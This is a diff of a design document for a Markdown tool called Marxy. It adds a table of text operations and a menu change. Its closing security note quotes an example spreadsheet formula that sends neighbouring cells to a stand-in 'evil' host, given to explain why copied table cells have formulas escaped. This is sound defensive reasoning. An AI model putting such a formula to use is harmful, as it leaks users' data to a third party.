@@ -163,6 +163,26 @@ Algorithm, on `text = textOf(range)`:
 | CRLF table | every line keeps `\r\n` |
 | 40-row pathological table | completes in < 5 ms |
 
+## The operations of Phase E (`packages/core/src/operations/`)
+
+Added after the four above, each one file (or one file per family) in `OPERATIONS`, each with its own table of cases
+in its test, so they are not repeated here. All are `string → string` over one range, held by the same fidelity
+property and by `assertMinimalDiff` against the bytes each means to change (`operations/testing/test-kit.ts`).
+
+| Id | Applies to | What it changes |
+| --- | --- | --- |
+| `unwrap-markdown-fence` | a `markdown` or `md` fenced block | the two fence lines go; every content byte stays |
+| `promote-heading`, `demote-heading` | a heading (its section is the range) | the `#` run of the heading and of each sub-heading, one level |
+| `renumber-list`, `list-to-numbers`, `list-to-bullets`, `bullets-from-glyphs` | a list; a paragraph of glyph bullets | the marker bytes, and the continuation lines' indent where a marker's width moved |
+| `sort-list-items` | a list | the order of the top-level items, A to Z, each carrying its own bytes |
+| `format-json`, `format-yaml` | a fenced `json` or `yaml` block | the whitespace of the block's content, two spaces per level |
+| `dedupe-lines` | a run of blocks (`Shift+click`) | a line that repeats an earlier one is removed; the first stays |
+
+Which of them the verb menu shows is the table under *Default verbs*, in `MENU_ORDER`; today only `dedupe-lines`
+(on a block), `toggle-task` and `align-table-pipes` have a row, and the rest are reached from the palette's `>`
+list. The phase's screen criterion, which composes paste, unwrap, a task click and an edit in place on LF and CRLF
+files, is `apps/desktop/test/phase-e-flow.test.mjs`.
+
 ## Default verbs and the verb menu (ADR-0054)
 
 One menu is the click surface for operations, and `Mod+C` runs a default copy verb. Both read one
@@ -191,7 +211,7 @@ operations not yet registered are skipped.
 | section | `op.copy-section`, `op.copy-rich`, `op.copy-plain`, `op.extract-tasks`, `op.extract-code-blocks`, `op.extract-links`, `view.jump-to-source` | `op.copy-section` | `op.copy-section` |
 | document | `op.copy-section`, `op.copy-plain`, `op.extract-tasks`, `op.extract-code-blocks`, `op.extract-links` | `op.copy-section` | `op.copy-section` |
 | task | `op.toggle-task`, `op.copy-rich`, `op.copy-plain`, `op.copy-source`, `view.jump-to-source` | `op.copy-rich`, `op.copy-source` | `op.copy-source` |
-| block | `op.copy-rich`, `op.copy-plain`, `op.copy-source`, `view.jump-to-source` | `op.copy-rich`, `op.copy-source` | `op.copy-source` |
+| block | `op.copy-rich`, `op.copy-plain`, `op.copy-source`, `op.dedupe-lines`, `view.jump-to-source` | `op.copy-rich`, `op.copy-source` | `op.copy-source` |
 | inline | `op.copy-source`, `view.jump-to-source` | `op.copy-source` | `op.copy-source` |
 
 **Table copies carry no live formula.** Marxy opens untrusted documents, and a cell such as `=IMPORTXML("https://evil/?q="&A2,"//a")` pasted into Sheets would run and send the neighbouring cells to a third party, which the reader never asked for (private by default). The TSV text, its HTML and the CSV therefore prefix one `'` to a cell that starts with `=` or `@`, or with `+` or `-` unless the whole cell is a plain number (`-5`, `+1`, `-0.5`, `-1e3` stay as they are). Faithful-to-the-bytes is about the document; this is a derived payload whose purpose is a spreadsheet. The cost is a leading apostrophe on the rare `=`, `@` or `+text` cell, which Sheets and Excel treat as a text marker. JSON and "Copy as plain text" are not formula contexts and stay faithful.
